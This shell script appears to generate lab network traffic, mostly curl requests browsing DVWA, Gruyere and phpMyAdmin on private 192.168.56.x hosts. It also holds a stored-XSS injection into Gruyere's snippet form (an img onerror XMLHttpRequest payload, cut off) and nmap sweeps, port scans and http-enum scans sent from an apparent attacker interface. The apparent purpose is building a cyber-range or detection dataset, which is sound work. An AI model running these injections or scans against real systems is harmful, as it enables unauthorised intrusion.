    $'http://192.168.56.113/dvwa/'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/index.php' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    $'http://192.168.56.113/dvwa/dvwa/js/dvwaPage.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/dvwa/login.php' -H $'Connection: close' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    $'http://192.168.56.113/dvwa/index.php'




curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/js/creative.min.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/favicon.ico'
sleep 12
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/view.php?page=tools.html'
sleep 6
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Cookie: PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
    $'http://192.168.56.108/phpMyAdmin/'



curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.56.108/'









curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/gruyere/'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/lib.js'



curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=admin&Submit=Submit' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' \
    $'http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=1234&Submit=Submit'



curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' \
    $'http://192.168.56.113/1142014131/newsnippet2?snippet=%3Cimg+src%3D%22troolll%22+onerror%3D%27minion+%3D+new+XMLHttpRequest'











nmap -n -sn 192.168.56.0/24 -e $A2i -S $A2 &
sleep 10
nmap -n $ZC2 -e $A2i -S $A2 &
sleep 5
nmap -sV --script=http-enum $ZC2 -e $A2i -S $A2 &>/dev/null &



















curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/newsnippet.gtl'
sleep 5
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/newsnippet2?snippet=Hey+everyone%21%21%21%21'
sleep 10
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/snippets.gtl'















sleep 6

curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/newsnippet.gtl'

curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/newsnippet2?snippet=Hey+everyone%21%21%21%21'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/snippets.gtl'

















curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/jquery/jquery.min.js'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/bootstrap/js/bootstrap.min.js'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/scrollreveal/scrollreveal.min.js'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/magnific-popup/jquery.magnific-popup.min.js'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/js/creative.min.js'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/favicon.ico'
sleep 3
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.56.108/'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/view.php?page=tools.html'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Cookie: PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
    $'http://192.168.56.108/phpMyAdmin/'



curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/gruyere/'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/lib.js'

curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'tz_offset=-21600' \
    $'http://192.168.56.113/dvwa/'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/index.php' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    $'http://192.168.56.113/dvwa/dvwa/js/dvwaPage.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/dvwa/login.php' -H $'Connection: close' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    $'http://192.168.56.113/dvwa/index.php'







curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'If-Modified-Since: Sun, 06 Aug 2017 05:02:15 GMT' -H $'If-None-Match: \"8ce8-5560ea23d23c0-gzip\"' \
    $'http://lsa/'
